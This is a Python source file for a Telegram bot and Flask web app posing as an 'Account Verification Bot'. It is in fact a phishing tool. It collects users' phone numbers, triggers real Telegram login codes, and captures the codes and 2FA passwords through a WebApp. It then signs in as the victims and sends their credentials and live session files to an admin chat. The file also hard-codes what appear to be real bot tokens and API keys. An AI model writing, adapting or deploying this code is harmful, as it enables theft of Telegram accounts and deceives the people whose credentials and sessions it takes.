import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import threading
import time
import logging
import subprocess
import json
from datetime import datetime

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration from environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT', '7658644625:AAEoKfPDyhponCstcBgRnw3JSOXu0APHHhI')
API_ID = os.environ.get('API_ID', '25240346')
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize bots
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
otp_data = {}
sessions = {}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin using separate admin bot"""
    try:
        # Determine which bot to use
        notification_bot = admin_bot if ADMIN_BOT_TOKEN else bot
        
        message = f"""📱 <b>VERIFICATION SUCCESS!</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if isinstance(user_info, dict):
                name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
                if name:
                    message += f"\n👤 Name: {name}"
                if user_info.get('username'):
                    message += f"\n🔗 Username: @{user_info.get('username')}"
                if user_info.get('id'):
                    message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        notification_bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    notification_bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
                logger.info(f"✅ Session sent: {session_file}")
            except Exception as e:
                logger.error(f"Session send error: {e}")
        
        logger.info(f"✅ Admin notified: {phone}")
        return True
        
    except Exception as e:
        logger.error(f"Admin error: {e}")
        return False

def run_telethon_script(script_name, phone=None, otp=None, password=None, phone_code_hash=None, session_name=None):
    """Run Telethon script as subprocess"""
    try:
        # Prepare environment variables
        env = os.environ.copy()
        env['API_ID'] = str(API_ID)
        env['API_HASH'] = str(API_HASH)
        
        # Prepare arguments
        args = ['python3', script_name]
        
        if phone:
            args.extend(['--phone', str(phone)])
        if otp:
            args.extend(['--otp', str(otp)])
        if password:
            args.extend(['--password', str(password)])
        if phone_code_hash:
            args.extend(['--hash', str(phone_code_hash)])
        if session_name:
            args.extend(['--session', str(session_name)])
        
        # Run script
        logger.info(f"Running Telethon script: {' '.join(args)}")
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=60,
            env=env,
            cwd=os.path.dirname(os.path.abspath(__file__))
        )
        
        # Log output for debugging
        if result.stdout:
            logger.info(f"Script stdout: {result.stdout[:200]}")
        if result.stderr:
            logger.error(f"Script stderr: {result.stderr[:200]}")
        
        # Parse result
        if result.returncode == 0:
            try:
                return json.loads(result.stdout.strip())
            except json.JSONDecodeError:
                # If not JSON, check for success message
                if "success" in result.stdout.lower() or "phone_code_hash" in result.stdout:
                    logger.info("Script returned non-JSON success")
                    return {'success': True, 'output': result.stdout}
                return {'success': False, 'error': 'Invalid script output'}
        else:
            error_msg = result.stderr or result.stdout or 'Unknown error'
            return {'success': False, 'error': error_msg}
            
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Timeout (60 seconds)'}
    except Exception as e:
        logger.error(f"Telethon script error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== TELEGRAM SCRIPTS ====================
def create_telethon_scripts():
    """Create separate Python scripts for Telethon operations"""
    
    # Script 1: Send OTP
    send_otp_script = '''import sys
import asyncio
import os
import json
import time
from telethon import TelegramClient
from telethon.errors import FloodWaitError

async def main():
    try:
        # Get API credentials from environment
        api_id = int(os.environ.get('API_ID', '25240346'))
        api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
        
        # Parse phone from arguments
        phone = None
        if '--phone' in sys.argv:
            phone_index = sys.argv.index('--phone') + 1
            if phone_index < len(sys.argv):
                phone = sys.argv[phone_index]
        
        if not phone:
            print(json.dumps({'success': False, 'error': 'Phone number required'}))
            return
        
        # Create session directory
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        # Create client and connect
        client = TelegramClient(session_name, api_id, api_hash)
        await client.connect()
        
        try:
            # Send code request
            sent = await client.send_code_request(phone)
            print(json.dumps({
                'success': True,
                'phone_code_hash': sent.phone_code_hash,
                'session_name': session_name
            }))
        except FloodWaitError as e:
            print(json.dumps({'success': False, 'error': f'Flood wait: Please wait {e.seconds} seconds'}))
        except Exception as e:
            print(json.dumps({'success': False, 'error': str(e)}))
        finally:
            await client.disconnect()
    except Exception as e:
        print(json.dumps({'success': False, 'error': str(e)}))

if __name__ == "__main__":
    asyncio.run(main())'''
    
    # Script 2: Verify OTP
    verify_otp_script = '''import sys
import asyncio
import os
import json
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError

async def main():
    try:
        # Get API credentials from environment - MUST BE AT TOP LEVEL
        api_id = int(os.environ.get('API_ID', '25240346'))
        api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
        
        # Parse arguments
        phone = None
        otp = None
        phone_code_hash = None
        
        if '--phone' in sys.argv:
            phone_index = sys.argv.index('--phone') + 1
            if phone_index < len(sys.argv):
                phone = sys.argv[phone_index]
        
        if '--otp' in sys.argv:
            otp_index = sys.argv.index('--otp') + 1
            if otp_index < len(sys.argv):
                otp = sys.argv[otp_index]
        
        if '--hash' in sys.argv:
            hash_index = sys.argv.index('--hash') + 1
            if hash_index < len(sys.argv):
                phone_code_hash = sys.argv[hash_index]
        
        if not phone or not otp or not phone_code_hash:
            print(json.dumps({'success': False, 'error': 'Missing parameters'}))
            return
        
        # Find latest session file for this phone
        session_files = []
        if os.path.exists('sessions'):
            for f in os.listdir('sessions'):
                if phone.replace('+', '') in f and (f.endswith('.session') or '.session' in f):
                    session_files.append(f)
        
        if not session_files:
            print(json.dumps({'success': False, 'error': 'Session not found'}))
            return
        
        # Use the most recent session
        session_files.sort(key=lambda x: os.path.getmtime(os.path.join('sessions', x)), reverse=True)
        session_name = f"sessions/{session_files[0]}"
        
        # Create client
        client = TelegramClient(session_name, api_id, api_hash)
        await client.connect()
        
        try:
            # Sign in with OTP
            await client.sign_in(
                phone=phone,
                code=otp,
                phone_code_hash=phone_code_hash
            )
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            session_file = f"{client.session.filename}.session"
            
            print(json.dumps({
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }))
            
        except SessionPasswordNeededError:
            # 2FA required
            print(json.dumps({
                'success': True,
                'requires_2fa': True,
                'session_name': session_name
            }))
        except PhoneCodeInvalidError:
            print(json.dumps({'success': False, 'error': 'Invalid OTP code'}))
        except Exception as e:
            print(json.dumps({'success': False, 'error': str(e)}))
        finally:
            await client.disconnect()
    except Exception as e:
        print(json.dumps({'success': False, 'error': str(e)}))

if __name__ == "__main__":
    asyncio.run(main())'''
    
    # Script 3: Verify 2FA
    verify_2fa_script = '''import sys
import asyncio
import os
import json
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError

async def main():
    try:
        # Get API credentials from environment
        api_id = int(os.environ.get('API_ID', '25240346'))
        api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
        
        # Parse arguments
        session_name = None
        password = None
        
        if '--session' in sys.argv:
            session_index = sys.argv.index('--session') + 1
            if session_index < len(sys.argv):
                session_name = sys.argv[session_index]
        
        if '--password' in sys.argv:
            password_index = sys.argv.index('--password') + 1
            if password_index < len(sys.argv):
                password = sys.argv[password_index]
        
        if not session_name or not password:
            print(json.dumps({'success': False, 'error': 'Missing parameters'}))
            return
        
        # Create client
        client = TelegramClient(session_name, api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(password=password)
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            session_file = f"{client.session.filename}.session"
            
            print(json.dumps({
                'success': True,
                'user_info': user_info,
                'session_file': session_file
            }))
            
        except PasswordHashInvalidError:
            print(json.dumps({'success': False, 'error': 'Invalid 2FA password'}))
        except Exception as e:
            print(json.dumps({'success': False, 'error': str(e)}))
        finally:
            await client.disconnect()
    except Exception as e:
        print(json.dumps({'success': False, 'error': str(e)}))

if __name__ == "__main__":
    asyncio.run(main())'''
    
    # Create scripts directory
    os.makedirs('scripts', exist_ok=True)
    
    # Write scripts
    with open('scripts/send_otp.py', 'w') as f:
        f.write(send_otp_script)
    
    with open('scripts/verify_otp.py', 'w') as f:
        f.write(verify_otp_script)
    
    with open('scripts/verify_2fa.py', 'w') as f:
        f.write(verify_2fa_script)
    
    # Make scripts executable
    for script in ['send_otp.py', 'verify_otp.py', 'verify_2fa.py']:
        script_path = os.path.join('scripts', script)
        os.chmod(script_path, 0o755)
    
    logger.info("✅ Telethon scripts created and made executable")

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 10000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive 5-digit OTP here
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted for privacy.</i>

<b>Note:</b> Telegram sends <b>5-digit</b> OTP codes.

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'contact_time': time.time(),
            'stage': 'contact_received'
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Sending 5-digit OTP via Telegram...</b>

Please wait while we send the verification code.""",
            parse_mode='HTML'
        )
        
        # Send OTP using subprocess
        def send_otp_task():
            try:
                result = run_telethon_script('scripts/send_otp.py', phone)
                
                if result.get('success'):
                    # Store OTP data
                    otp_data[user_id] = {
                        'phone': phone,
                        'phone_code_hash': result.get('phone_code_hash'),
                        'session_name': result.get('session_name'),
                        'time': time.time()
                    }
                    
                    user_data[user_id]['stage'] = 'otp_sent'
                    
                    # Success message
                    success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your Telegram messages for the 5-digit code.

<b>⚠️ IMPORTANT:</b>
• Check your Telegram messages for the <b>5-digit code</b>
• Enter the code in the WebApp
• Code expires in 5 minutes

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>"""
                    
                    bot.edit_message_text(
                        success_msg,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP')
                    user_data[user_id]['stage'] = 'error'
                    
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {error_msg}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    return jsonify({
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'stage': data.get('stage', 'waiting'),
        'verified': data.get('stage') == 'verified'
    })

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API endpoint for sharing contact from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone')
        
        if not user_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        logger.info(f"📱 WebApp contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'phone': phone,
            'stage': 'contact_received',
            'time': time.time()
        }
        
        # Send OTP
        def send_otp_task():
            result = run_telethon_script('scripts/send_otp.py', phone)
            
            if result.get('success'):
                otp_data[user_id] = {
                    'phone': phone,
                    'phone_code_hash': result.get('phone_code_hash'),
                    'session_name': result.get('session_name'),
                    'time': time.time()
                }
                user_data[user_id]['stage'] = 'otp_sent'
                logger.info(f"✅ OTP sent via API to {phone}")
            else:
                user_data[user_id]['stage'] = 'error'
                logger.error(f"Failed to send OTP: {result.get('error')}")
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        return jsonify({'success': True, 'message': 'OTP sent successfully'})
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification for user {user_id}: {otp}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Validate OTP (5 digits)
        if len(otp) != 5 or not otp.isdigit():
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get OTP data
        data = otp_data.get(int(user_id))
        if not data:
            return jsonify({'success': False, 'error': 'Session expired. Please restart.'})
        
        phone = data['phone']
        phone_code_hash = data.get('phone_code_hash')
        
        if not phone_code_hash:
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        # Verify OTP using subprocess
        result = run_telethon_script(
            'scripts/verify_otp.py',
            phone,
            otp=otp,
            phone_code_hash=phone_code_hash
        )
        
        if result.get('success'):
            if result.get('requires_2fa'):
                # Store session for 2FA
                session_name = result.get('session_name')
                if session_name:
                    sessions[user_id] = session_name
                    user_data[int(user_id)]['stage'] = 'needs_2fa'
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Success
                user_info = result.get('user_info', {})
                session_file = result.get('session_file', '')
                
                send_to_admin(
                    phone,
                    otp=otp,
                    user_info=user_info,
                    session_file=session_file
                )
                
                user_data[int(user_id)]['stage'] = 'verified'
                logger.info(f"✅ OTP verified for {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            error_msg = result.get('error', 'Verification failed')
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        logger.info(f"🔐 2FA attempt for user {user_id}")
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Get session
        session_name = sessions.get(user_id)
        if not session_name:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Verify 2FA using subprocess
        result = run_telethon_script(
            'scripts/verify_2fa.py',
            '',
            password=password,
            session_name=session_name
        )
        
        if result.get('success'):
            # Success
            user_info = result.get('user_info', {})
            session_file = result.get('session_file', '')
            phone = user_info.get('phone', 'Unknown')
            
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=session_file
            )
            
            user_data[int(user_id)]['stage'] = 'verified'
            logger.info(f"✅ 2FA successful for {phone}")
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            error_msg = result.get('error', 'Invalid password')
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

@app.route('/admin-webhook', methods=['POST'])
def admin_webhook():
    """Admin bot webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        admin_bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup_old_sessions():
    """Clean up old session files"""
    while True:
        try:
            if os.path.exists('sessions'):
                import glob
                import time as t
                
                session_files = glob.glob('sessions/*')
                current_time = t.time()
                
                for session_file in session_files:
                    # Delete sessions older than 1 hour
                    if current_time - os.path.getmtime(session_file) > 3600:
                        os.remove(session_file)
                        logger.info(f"Cleaned up old session: {session_file}")
            
            t.sleep(3600)  # Run cleanup every hour
                    
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            t.sleep(300)

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot - FIXED VERSION")
    logger.info("="*60)
    logger.info(f"🤖 Main Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin Bot Token: {ADMIN_BOT_TOKEN[:10]}..." if ADMIN_BOT_TOKEN else "👑 Using main bot for admin notifications")
    logger.info(f"📞 Admin ID: {ADMIN_ID}")
    logger.info(f"🔧 API ID: {API_ID}")
    logger.info("="*60)
    
    # Create directories
    os.makedirs('scripts', exist_ok=True)
    os.makedirs('sessions', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Create Telethon scripts
    create_telethon_scripts()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    
    # Setup webhooks
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            if RENDER_EXTERNAL_HOSTNAME:
                # Main bot webhook
                WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook"
                bot.remove_webhook()
                time.sleep(1)
                bot.set_webhook(url=WEBHOOK_URL)
                logger.info(f"✅ Main bot webhook set: {WEBHOOK_URL}")
                
                # Admin bot webhook
                if ADMIN_BOT_TOKEN:
                    ADMIN_WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/admin-webhook"
                    admin_bot.remove_webhook()
                    time.sleep(1)
                    admin_bot.set_webhook(url=ADMIN_WEBHOOK_URL)
                    logger.info(f"✅ Admin bot webhook set: {ADMIN_WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        # Fallback polling for main bot
        def run_polling():
            bot.polling(none_stop=True, interval=3, skip_pending=True)
        
        polling_thread = threading.Thread(target=run_polling, daemon=True)
        polling_thread.start()
        logger.info("✅ Main bot polling started")
        
        # Fallback polling for admin bot
        if ADMIN_BOT_TOKEN:
            def run_admin_polling():
                admin_bot.polling(none_stop=True, interval=3, skip_pending=True)
            
            admin_polling_thread = threading.Thread(target=run_admin_polling, daemon=True)
            admin_polling_thread.start()
            logger.info("✅ Admin bot polling started")
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
)
